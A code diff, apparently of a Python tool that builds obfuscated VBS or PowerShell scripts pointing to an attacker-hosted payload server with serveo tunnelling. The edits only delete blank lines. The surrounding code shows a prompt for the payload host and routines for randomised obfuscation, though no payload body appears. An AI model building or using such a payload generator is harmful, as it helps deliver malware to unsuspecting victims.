@@ -31,7 +31,6 @@ def gen_gd():
 
 
 def clear():
-
 	if os.name == "nt": 
 		os.system('cls')
 	else: 
@@ -39,7 +38,6 @@ def clear():
 
 
 def vbs():
-
 	heavy = {'heavy','h'}
 	light = {'light','l'}
 	medium = {'medium', 'm'}
@@ -48,7 +46,6 @@ def vbs():
 
 
 	def executable():
-
 		clear()
 		input = raw_input("\nDo you want a light, medium or heavy script?: ").lower()
 		
@@ -67,7 +64,6 @@ def vbs():
 
 
 	def powershell():
-		
 		clear()
 		input = raw_input("\nDo you want a light, medium or heavy script?: ").lower()
 		
@@ -100,7 +96,6 @@ def vbs():
 
 
 def replace(script):
-
 	lstring = base64.b64decode(script)
 	lines = lstring[1:-1].split("', '")
 	ip = raw_input("\nEnter server IP address hosting your payload (Example: facebook.serveo.net): ")
@@ -118,11 +113,9 @@ def replace(script):
 
 
 def obfs():
-
 	D=str(chr(42))
 
 	def randCapitalization(characters):
-
 		G=""
 		for b in characters:
 			r=random.randrange(0,2)
@@ -140,7 +133,6 @@ def obfs():
 	L=''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase)for _ in range(H))
 
 	def obfu(body):
-
 		A=""
 		for i in range(0,len(body)):
 			if A=="":
@@ -150,7 +142,6 @@ def obfs():
 		return A
 
 	def expr(char):
-
 		range=random.randrange(100,10001)
 		N=random.randrange(0,3)
 		if N==0:
@@ -184,7 +175,6 @@ def obfs():
 	os.remove('t')
 
 def serveo():
-
 	clear()
 	yes = {'yes','y','ye',''}
 	no = {'no','n','exit'}
@@ -204,12 +194,10 @@ def serveo():
 
 
 def main():
-
 	clear()
 	gen_gd()
 	vbs()
 	obfs()
 	serveo()
-
 if __name__== "__main__":
 	main()
